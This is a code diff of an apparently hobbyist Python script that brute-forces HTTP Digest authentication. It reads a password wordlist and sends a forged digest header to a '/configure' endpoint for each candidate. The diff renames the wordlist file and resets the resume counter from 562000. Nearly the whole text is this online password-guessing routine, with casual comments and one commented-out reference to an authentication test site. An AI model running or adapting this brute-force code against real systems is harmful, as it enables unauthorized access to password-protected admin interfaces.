@@ -1,5 +1,6 @@
 import requests
 import hash
+
 # no need for this anymore :D
 # from requests.auth import HTTPDigestAuth
 
@@ -20,15 +21,15 @@ nc = 1
 r = requests.head(url1)
 # check if this slice is right, also idk how to get this via comprehension
 nonce = r.headers['WWW-Authenticate'][180:-13]
+# print(nonce)
 
 # fresh off the stack overflow griddle
-with open('pwd.txt') as file:
+with open('arst.txt') as file:
     # tf is list comprehension?
     passwords = [line.rstrip() for line in file]
 
 # manual progress tracking, I know
-total = 562000
-
+total = 0
 
 # make a request with each password, starting at the last one logged
 for i in range(total, len(passwords)):
@@ -38,8 +39,8 @@ for i in range(total, len(passwords)):
     h2 = hash.hash2('HEAD', '/configure')
     response = hash.response(h1, nonce, f'{nc:08d}', cnonce, qop, h2)
     headers = {
-        'WWW-Authenticate' : f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="/configure", '
-                             f'algorithm=MD5, response="{response}", qop=auth, nc={nc:08d}, cnonce="{cnonce}" '
+        'WWW-Authenticate': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="/configure", '
+                            f'algorithm=MD5, response="{response}", qop=auth, nc={nc:08d}, cnonce="{cnonce}" '
     }
     request = requests.head(url1, headers=headers)
     nc += 1
@@ -58,8 +59,7 @@ for i in range(total, len(passwords)):
     # print(request.request.headers)
     if i % 100 == 0:
         print(f'{i}, ', end='')
-    # print(f'{i}:{request.status_code}')
-
+    # print(f'{i}:{request.status_code}, ', end='')
 
 # r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
 # print(r.status_code)
